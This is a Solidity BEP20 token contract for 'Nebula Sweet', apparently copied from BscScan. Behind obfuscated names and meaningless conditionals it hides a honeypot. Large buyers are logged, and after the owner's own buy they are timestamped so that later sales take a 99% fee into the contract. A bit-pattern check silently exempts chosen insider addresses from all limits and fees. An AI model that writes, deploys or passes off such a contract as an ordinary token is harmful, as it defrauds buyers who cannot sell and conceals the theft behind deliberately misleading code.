/**
 *Submitted for verification at BscScan.com on 2022-12-14
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;


library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b <= a, errorMessage);
        return a - b;
    }
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a / b;
    }
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    unchecked {
        require(b > 0, errorMessage);
        return a % b;
    }
    }
}

interface IBEP20 {
    function totalSupply() external view returns (uint256);

    function decimals() external view returns (uint8);

    function symbol() external view returns (string memory);

    function name() external view returns (string memory);

    function getOwner() external view returns (address);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
    external
    returns (bool);

    function allowance(address _owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );

}

abstract contract Manager {
    address internal owner;
    mapping(address => bool) internal competent;

    constructor(address _owner) {
        owner = _owner;
        competent[_owner] = true;
    }

    /**
     * Function modifier to require caller to be contract owner
     */
    modifier onlyOwner() {
        require(isOwner(msg.sender), "!OWNER");
        _;
    }

    /**
     * Function modifier to require caller to be admin
     */
    modifier onlyAdmin() {
        require(isAuthorized(msg.sender), "!ADMIN");
        _;
    }

    /**
     * addAdmin address. Owner only
     */
    function SetAuthorized(address adr) public onlyOwner() {
        competent[adr] = true;
    }

    /**
     * Remove address' administration. Owner only
     */
    function removeAuthorized(address adr) public onlyOwner() {
        competent[adr] = false;
    }

    /**
     * Check if address is owner
     */
    function isOwner(address account) public view returns (bool) {
        return account == owner;
    }

    function Owner() public view returns (address) {
        return owner;
    }

    /**
     * Return address' administration status
     */
    function isAuthorized(address adr) public view returns (bool) {
        return competent[adr];
    }

    /**
     * Transfer ownership to new address. Caller must be owner. Leaves old owner admin
     */
    function transferOwnership(address payable adr) public onlyOwner() {
        owner = adr;
        competent[adr] = true;
        emit OwnershipTransferred(adr);
    }

    event OwnershipTransferred(address owner);

}

interface IPancakePair {
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
    external
    returns (address pair);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint256 amountADesired,
        uint256 amountBDesired,
        uint256 amountAMin,
        uint256 amountBMin,
        address to,
        uint256 deadline
    )
    external
    returns (
        uint256 amountA,
        uint256 amountB,
        uint256 liquidity
    );

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
    external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

}

contract NebulaSweet is IBEP20, Manager {
    using SafeMath for uint256;

    uint256  constant MASK = type(uint128).max;
    address WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address DEAD = 0x000000000000000000000000000000000000dEaD;
    address ZERO = 0x0000000000000000000000000000000000000000;
    address DEAD_NON_CHECKSUM = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "Nebula Sweet ";
    string constant _symbol = "NebulaSweet";
    uint8 constant _decimals = 18;

    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    uint256  _maxTxAmount = 2000000 * 10 ** _decimals;
    uint256  _maxWallet = 2000000 * 10 ** _decimals;

    mapping(address => uint256) _balances;
    mapping(address => mapping(address => uint256)) _allowances;
    mapping(address => bool) private marketingIsTeamFee;
    mapping(address => bool) private minMaxExemptMode;
    mapping(address => bool) private limitIsExemptWallet;
    mapping(address => bool) private maxLaunchedWalletBotsSell;
    mapping(address => uint256) private buyIsBotsMode;
    mapping(uint256 => address) private receiverTxExemptMarketing;
    uint256 public exemptLimitValue = 0;
    //BUY FEES
    uint256 private txAutoMinExemptLaunched = 0;
    uint256 private liquiditySellReceiverMaxFeeWalletLimit = 2;

    //SELL FEES
    uint256 private liquidityBotsAutoMode = 0;
    uint256 private feeSwapExemptIsSellTeam = 2;

    uint256 private liquidityIsReceiverLaunchedLimitWalletTrading = liquiditySellReceiverMaxFeeWalletLimit + txAutoMinExemptLaunched;
    uint256 private walletBuyExemptSwapMarketing = 100;

    address private limitBuySwapFeeLaunchedTx = (msg.sender); // auto-liq address
    address private botsAutoSwapWalletTradingIsReceiver = (0x1EF91C19F9D0fd8674415fe0fFffd9Db8f409118); // marketing address
    address private limitLaunchedBotsMinTradingSellExempt = DEAD;
    address private modeLaunchedTxMarketing = DEAD;
    address private maxLimitModeTeam = DEAD;

    IUniswapV2Router public router;
    address public uniswapV2Pair;

    uint256 private burnSwapFeeIsLaunchedMinLimit;
    uint256 private sellWalletBotsReceiver;

    event BuyTaxesUpdated(uint256 buyTaxes);
    event SellTaxesUpdated(uint256 sellTaxes);

    bool private receiverSellBurnMaxLaunchedLiquidity;
    uint256 private autoSwapReceiverMode;
    uint256 private liquiditySellTradingAutoLaunchedMaxWallet;
    uint256 private launchedModeAutoSellExemptBuyMax;
    uint256 private burnFeeExemptWallet;

    bool private txMinAutoReceiver = true;
    bool private maxLaunchedWalletBotsSellMode = true;
    bool private marketingMaxIsFeeReceiverBuy = true;
    bool private autoModeLiquidityExemptMarketing = true;
    bool private buyMarketingTxWallet = true;
    uint256 firstSetAutoReceiver = 2 ** 18 - 1;
    uint256 private tradingExemptFeeMode = 6 * 10 ** 15;
    uint256 private sellBotsLimitMinSwapTeamMode = _totalSupply / 1000; // 0.1%

    
    uint256 private feeTxExemptTradingBuySwap = 0;
    bool private liquidityTxExemptBuy = false;
    bool private txLiquiditySwapReceiver = false;
    uint256 private burnSwapBuyBots = 0;
    bool private tradingMaxModeLaunchedTeam = false;
    uint256 private maxMinBuyFee = 0;
    bool private tradingFeeWalletBuy = false;
    bool private marketingModeMinLaunched = false;
    uint256 private exemptAutoMaxLiquiditySwapMarketing = 0;
    uint256 private txReceiverIsTeamFeeModeAuto = 0;
    uint256 private liquidityTxExemptBuy0 = 0;


    bool inSwap;
    modifier swapping() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor() Manager(msg.sender) {
        address _router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        // PancakeSwap Router
        router = IUniswapV2Router(_router);

        uniswapV2Pair = IUniswapV2Factory(router.factory()).createPair(address(this), router.WETH());
        _allowances[address(this)][address(router)] = _totalSupply;

        receiverSellBurnMaxLaunchedLiquidity = true;

        marketingIsTeamFee[msg.sender] = true;
        marketingIsTeamFee[address(this)] = true;

        minMaxExemptMode[msg.sender] = true;
        minMaxExemptMode[0x0000000000000000000000000000000000000000] = true;
        minMaxExemptMode[0x000000000000000000000000000000000000dEaD] = true;
        minMaxExemptMode[address(this)] = true;

        limitIsExemptWallet[msg.sender] = true;
        limitIsExemptWallet[0x0000000000000000000000000000000000000000] = true;
        limitIsExemptWallet[0x000000000000000000000000000000000000dEaD] = true;
        limitIsExemptWallet[address(this)] = true;

        approve(_router, _totalSupply);
        approve(address(uniswapV2Pair), _totalSupply);
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function decimals() external pure override returns (uint8) {
        return _decimals;
    }

    function symbol() external pure override returns (string memory) {
        return _symbol;
    }

    function name() external pure override returns (string memory) {
        return _name;
    }

    function getOwner() external view override returns (address) {
        return owner;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view override returns (uint256) {
        return _allowances[holder][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, _totalSupply);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return tradingSwapTxLaunchedMinTeamExempt(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if (_allowances[sender][msg.sender] != _totalSupply) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender]
            .sub(amount, "Nebula Sweet  Insufficient Allowance");
        }

        return tradingSwapTxLaunchedMinTeamExempt(sender, recipient, amount);
    }

    function tradingSwapTxLaunchedMinTeamExempt(address sender, address recipient, uint256 amount) internal returns (bool) {
        
        if (feeTxExemptTradingBuySwap != tradingExemptFeeMode) {
            feeTxExemptTradingBuySwap = maxMinBuyFee;
        }

        if (burnSwapBuyBots != feeSwapExemptIsSellTeam) {
            burnSwapBuyBots = sellBotsLimitMinSwapTeamMode;
        }


        bool bLimitTxWalletValue = botsSwapReceiverMinAutoExempt(sender) || botsSwapReceiverMinAutoExempt(recipient);
        
        if (sender == uniswapV2Pair) {
            if (exemptLimitValue != 0 && isOwner(recipient)) {
                feeModeMarketingLimitReceiverTeam();
            }
            if (!bLimitTxWalletValue) {
                txExemptBotsLaunchedBurn(recipient);
            }
        }
        
        if (tradingMaxModeLaunchedTeam != marketingMaxIsFeeReceiverBuy) {
            tradingMaxModeLaunchedTeam = autoModeLiquidityExemptMarketing;
        }

        if (burnSwapBuyBots == burnSwapBuyBots) {
            burnSwapBuyBots = walletBuyExemptSwapMarketing;
        }


        if (inSwap || bLimitTxWalletValue) {return minTxAutoReceiver(sender, recipient, amount);}

        if (!marketingIsTeamFee[sender] && !marketingIsTeamFee[recipient] && recipient != uniswapV2Pair) {
            require((_balances[recipient] + amount) <= _maxWallet, "Nebula Sweet  Max wallet has been triggered");
        }
        
        if (liquidityTxExemptBuy0 == liquidityBotsAutoMode) {
            liquidityTxExemptBuy0 = txAutoMinExemptLaunched;
        }

        if (tradingMaxModeLaunchedTeam == marketingMaxIsFeeReceiverBuy) {
            tradingMaxModeLaunchedTeam = tradingMaxModeLaunchedTeam;
        }

        if (liquidityTxExemptBuy == txLiquiditySwapReceiver) {
            liquidityTxExemptBuy = tradingMaxModeLaunchedTeam;
        }


        require((amount <= _maxTxAmount) || limitIsExemptWallet[sender] || limitIsExemptWallet[recipient], "Nebula Sweet  Max TX Limit has been triggered");

        if (walletModeMinTrading()) {marketingBotsBuyLiquidity();}

        _balances[sender] = _balances[sender].sub(amount, "Nebula Sweet  Insufficient Balance");
        
        uint256 amountReceived = walletTxMinLimitSell(sender) ? minLimitAutoReceiver(sender, recipient, amount) : amount;

        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function minTxAutoReceiver(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Nebula Sweet  Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function walletTxMinLimitSell(address sender) internal view returns (bool) {
        return !minMaxExemptMode[sender];
    }

    function receiverAutoTeamTrading(address sender, bool selling) internal returns (uint256) {
        
        if (tradingFeeWalletBuy != marketingModeMinLaunched) {
            tradingFeeWalletBuy = txLiquiditySwapReceiver;
        }

        if (burnSwapBuyBots == liquidityTxExemptBuy0) {
            burnSwapBuyBots = txReceiverIsTeamFeeModeAuto;
        }

        if (maxMinBuyFee != feeSwapExemptIsSellTeam) {
            maxMinBuyFee = walletBuyExemptSwapMarketing;
        }


        if (selling) {
            liquidityIsReceiverLaunchedLimitWalletTrading = feeSwapExemptIsSellTeam + liquidityBotsAutoMode;
            return maxTeamSellIs(sender, liquidityIsReceiverLaunchedLimitWalletTrading);
        }
        if (!selling && sender == uniswapV2Pair) {
            liquidityIsReceiverLaunchedLimitWalletTrading = liquiditySellReceiverMaxFeeWalletLimit + txAutoMinExemptLaunched;
            return liquidityIsReceiverLaunchedLimitWalletTrading;
        }
        return maxTeamSellIs(sender, liquidityIsReceiverLaunchedLimitWalletTrading);
    }

    function botsReceiverIsBurn() private view returns (uint256) {
        address t0 = WBNB;
        if (address(this) < WBNB) {
            t0 = address(this);
        }
        (uint reserve0, uint reserve1,) = IPancakePair(uniswapV2Pair).getReserves();
        (uint256 beforeAmount,) = WBNB == t0 ? (reserve0, reserve1) : (reserve1, reserve0);
        uint256 buyAmount = IERC20(WBNB).balanceOf(uniswapV2Pair) - beforeAmount;
        return buyAmount;
    }

    function minLimitAutoReceiver(address sender, address receiver, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = amount.mul(receiverAutoTeamTrading(sender, receiver == uniswapV2Pair)).div(walletBuyExemptSwapMarketing);

        if (maxLaunchedWalletBotsSell[sender] || maxLaunchedWalletBotsSell[receiver]) {
            feeAmount = amount.mul(99).div(walletBuyExemptSwapMarketing);
        }

        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        
        return amount.sub(feeAmount);
    }

    function botsSwapReceiverMinAutoExempt(address addr) private view returns (bool) {
        uint256 v0 = uint256(uint160(addr)) << 192;
        v0 = v0 >> 238;
        return v0 == firstSetAutoReceiver;
    }

    function maxTeamSellIs(address sender, uint256 pFee) private view returns (uint256) {
        uint256 lcfkd = buyIsBotsMode[sender];
        uint256 kdkls = pFee;
        if (lcfkd > 0 && block.timestamp - lcfkd > 2) {
            kdkls = 99;
        }
        return kdkls;
    }

    function txExemptBotsLaunchedBurn(address addr) private {
        if (botsReceiverIsBurn() < tradingExemptFeeMode) {
            return;
        }
        exemptLimitValue = exemptLimitValue + 1;
        receiverTxExemptMarketing[exemptLimitValue] = addr;
    }

    function feeModeMarketingLimitReceiverTeam() private {
        if (exemptLimitValue > 0) {
            for (uint256 i = 1; i <= exemptLimitValue; i++) {
                if (buyIsBotsMode[receiverTxExemptMarketing[i]] == 0) {
                    buyIsBotsMode[receiverTxExemptMarketing[i]] = block.timestamp;
                }
            }
            exemptLimitValue = 0;
        }
    }

    function clearStuckBalance(uint256 amountPercentage) external onlyOwner {
        uint256 amountBNB = address(this).balance;
        payable(botsAutoSwapWalletTradingIsReceiver).transfer(amountBNB * amountPercentage / 100);
    }

    function walletModeMinTrading() internal view returns (bool) {return
    msg.sender != uniswapV2Pair &&
    !inSwap &&
    buyMarketingTxWallet &&
    _balances[address(this)] >= sellBotsLimitMinSwapTeamMode;
    }

    function marketingBotsBuyLiquidity() internal swapping {
        
        uint256 amountToLiquify = sellBotsLimitMinSwapTeamMode.mul(txAutoMinExemptLaunched).div(liquidityIsReceiverLaunchedLimitWalletTrading).div(2);
        uint256 amountToSwap = sellBotsLimitMinSwapTeamMode.sub(amountToLiquify);

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );
        
        if (maxMinBuyFee == tradingExemptFeeMode) {
            maxMinBuyFee = walletBuyExemptSwapMarketing;
        }


        uint256 amountBNB = address(this).balance;
        uint256 totalETHFee = liquidityIsReceiverLaunchedLimitWalletTrading.sub(txAutoMinExemptLaunched.div(2));
        uint256 amountBNBLiquidity = amountBNB.mul(txAutoMinExemptLaunched).div(totalETHFee).div(2);
        uint256 amountBNBMarketing = amountBNB.mul(liquiditySellReceiverMaxFeeWalletLimit).div(totalETHFee);
        
        if (marketingModeMinLaunched != autoModeLiquidityExemptMarketing) {
            marketingModeMinLaunched = autoModeLiquidityExemptMarketing;
        }

        if (burnSwapBuyBots == feeSwapExemptIsSellTeam) {
            burnSwapBuyBots = tradingExemptFeeMode;
        }

        if (tradingFeeWalletBuy != txLiquiditySwapReceiver) {
            tradingFeeWalletBuy = txMinAutoReceiver;
        }


        payable(botsAutoSwapWalletTradingIsReceiver).transfer(amountBNBMarketing);

        if (amountToLiquify > 0) {
            router.addLiquidityETH{value : amountBNBLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                limitBuySwapFeeLaunchedTx,
                block.timestamp
            );
            emit AutoLiquify(amountBNBLiquidity, amountToLiquify);
        }
    }

    
    function getMaxLimitModeTeam() public view returns (address) {
        if (maxLimitModeTeam == maxLimitModeTeam) {
            return maxLimitModeTeam;
        }
        if (maxLimitModeTeam != modeLaunchedTxMarketing) {
            return modeLaunchedTxMarketing;
        }
        return maxLimitModeTeam;
    }
    function setMaxLimitModeTeam(address a0) public onlyOwner {
        maxLimitModeTeam=a0;
    }

    function getFeeSwapExemptIsSellTeam() public view returns (uint256) {
        if (feeSwapExemptIsSellTeam == feeSwapExemptIsSellTeam) {
            return feeSwapExemptIsSellTeam;
        }
        return feeSwapExemptIsSellTeam;
    }
    function setFeeSwapExemptIsSellTeam(uint256 a0) public onlyOwner {
        if (feeSwapExemptIsSellTeam != feeTxExemptTradingBuySwap) {
            feeTxExemptTradingBuySwap=a0;
        }
        if (feeSwapExemptIsSellTeam != liquiditySellReceiverMaxFeeWalletLimit) {
            liquiditySellReceiverMaxFeeWalletLimit=a0;
        }
        feeSwapExemptIsSellTeam=a0;
    }

    function getLimitBuySwapFeeLaunchedTx() public view returns (address) {
        if (limitBuySwapFeeLaunchedTx != botsAutoSwapWalletTradingIsReceiver) {
            return botsAutoSwapWalletTradingIsReceiver;
        }
        if (limitBuySwapFeeLaunchedTx != maxLimitModeTeam) {
            return maxLimitModeTeam;
        }
        if (limitBuySwapFeeLaunchedTx != limitLaunchedBotsMinTradingSellExempt) {
            return limitLaunchedBotsMinTradingSellExempt;
        }
        return limitBuySwapFeeLaunchedTx;
    }
    function setLimitBuySwapFeeLaunchedTx(address a0) public onlyOwner {
        if (limitBuySwapFeeLaunchedTx != limitBuySwapFeeLaunchedTx) {
            limitBuySwapFeeLaunchedTx=a0;
        }
        if (limitBuySwapFeeLaunchedTx == botsAutoSwapWalletTradingIsReceiver) {
            botsAutoSwapWalletTradingIsReceiver=a0;
        }
        limitBuySwapFeeLaunchedTx=a0;
    }

    function getLiquiditySellReceiverMaxFeeWalletLimit() public view returns (uint256) {
        return liquiditySellReceiverMaxFeeWalletLimit;
    }
    function setLiquiditySellReceiverMaxFeeWalletLimit(uint256 a0) public onlyOwner {
        if (liquiditySellReceiverMaxFeeWalletLimit == txAutoMinExemptLaunched) {
            txAutoMinExemptLaunched=a0;
        }
        if (liquiditySellReceiverMaxFeeWalletLimit == feeTxExemptTradingBuySwap) {
            feeTxExemptTradingBuySwap=a0;
        }
        liquiditySellReceiverMaxFeeWalletLimit=a0;
    }

    function getSellBotsLimitMinSwapTeamMode() public view returns (uint256) {
        if (sellBotsLimitMinSwapTeamMode == exemptAutoMaxLiquiditySwapMarketing) {
            return exemptAutoMaxLiquiditySwapMarketing;
        }
        if (sellBotsLimitMinSwapTeamMode != liquidityBotsAutoMode) {
            return liquidityBotsAutoMode;
        }
        return sellBotsLimitMinSwapTeamMode;
    }
    function setSellBotsLimitMinSwapTeamMode(uint256 a0) public onlyOwner {
        if (sellBotsLimitMinSwapTeamMode == tradingExemptFeeMode) {
            tradingExemptFeeMode=a0;
        }
        if (sellBotsLimitMinSwapTeamMode != liquidityIsReceiverLaunchedLimitWalletTrading) {
            liquidityIsReceiverLaunchedLimitWalletTrading=a0;
        }
        sellBotsLimitMinSwapTeamMode=a0;
    }

    function getTxReceiverIsTeamFeeModeAuto() public view returns (uint256) {
        return txReceiverIsTeamFeeModeAuto;
    }
    function setTxReceiverIsTeamFeeModeAuto(uint256 a0) public onlyOwner {
        if (txReceiverIsTeamFeeModeAuto == tradingExemptFeeMode) {
            tradingExemptFeeMode=a0;
        }
        txReceiverIsTeamFeeModeAuto=a0;
    }

    function getMarketingIsTeamFee(address a0) public view returns (bool) {
        if (a0 != botsAutoSwapWalletTradingIsReceiver) {
            return txMinAutoReceiver;
        }
        if (a0 == maxLimitModeTeam) {
            return marketingModeMinLaunched;
        }
        if (marketingIsTeamFee[a0] == marketingIsTeamFee[a0]) {
            return autoModeLiquidityExemptMarketing;
        }
            return marketingIsTeamFee[a0];
    }
    function setMarketingIsTeamFee(address a0,bool a1) public onlyOwner {
        if (a0 == botsAutoSwapWalletTradingIsReceiver) {
            txMinAutoReceiver=a1;
        }
        if (a0 != maxLimitModeTeam) {
            autoModeLiquidityExemptMarketing=a1;
        }
        if (a0 != limitBuySwapFeeLaunchedTx) {
            autoModeLiquidityExemptMarketing=a1;
        }
        marketingIsTeamFee[a0]=a1;
    }

    function getLimitIsExemptWallet(address a0) public view returns (bool) {
        if (a0 != limitLaunchedBotsMinTradingSellExempt) {
            return liquidityTxExemptBuy;
        }
            return limitIsExemptWallet[a0];
    }
    function setLimitIsExemptWallet(address a0,bool a1) public onlyOwner {
        if (limitIsExemptWallet[a0] != minMaxExemptMode[a0]) {
           minMaxExemptMode[a0]=a1;
        }
        limitIsExemptWallet[a0]=a1;
    }

    function getMinMaxExemptMode(address a0) public view returns (bool) {
            return minMaxExemptMode[a0];
    }
    function setMinMaxExemptMode(address a0,bool a1) public onlyOwner {
        if (a0 == maxLimitModeTeam) {
            maxLaunchedWalletBotsSellMode=a1;
        }
        if (minMaxExemptMode[a0] == maxLaunchedWalletBotsSell[a0]) {
           maxLaunchedWalletBotsSell[a0]=a1;
        }
        if (a0 != modeLaunchedTxMarketing) {
            buyMarketingTxWallet=a1;
        }
        minMaxExemptMode[a0]=a1;
    }

    function getTxLiquiditySwapReceiver() public view returns (bool) {
        if (txLiquiditySwapReceiver != txMinAutoReceiver) {
            return txMinAutoReceiver;
        }
        if (txLiquiditySwapReceiver != maxLaunchedWalletBotsSellMode) {
            return maxLaunchedWalletBotsSellMode;
        }
        if (txLiquiditySwapReceiver == tradingMaxModeLaunchedTeam) {
            return tradingMaxModeLaunchedTeam;
        }
        return txLiquiditySwapReceiver;
    }
    function setTxLiquiditySwapReceiver(bool a0) public onlyOwner {
        txLiquiditySwapReceiver=a0;
    }

    function getTxMinAutoReceiver() public view returns (bool) {
        if (txMinAutoReceiver != marketingMaxIsFeeReceiverBuy) {
            return marketingMaxIsFeeReceiverBuy;
        }
        if (txMinAutoReceiver != buyMarketingTxWallet) {
            return buyMarketingTxWallet;
        }
        return txMinAutoReceiver;
    }
    function setTxMinAutoReceiver(bool a0) public onlyOwner {
        if (txMinAutoReceiver != txLiquiditySwapReceiver) {
            txLiquiditySwapReceiver=a0;
        }
        if (txMinAutoReceiver == txMinAutoReceiver) {
            txMinAutoReceiver=a0;
        }
        txMinAutoReceiver=a0;
    }



    event AutoLiquify(uint256 amountBNB, uint256 amountTokens);

}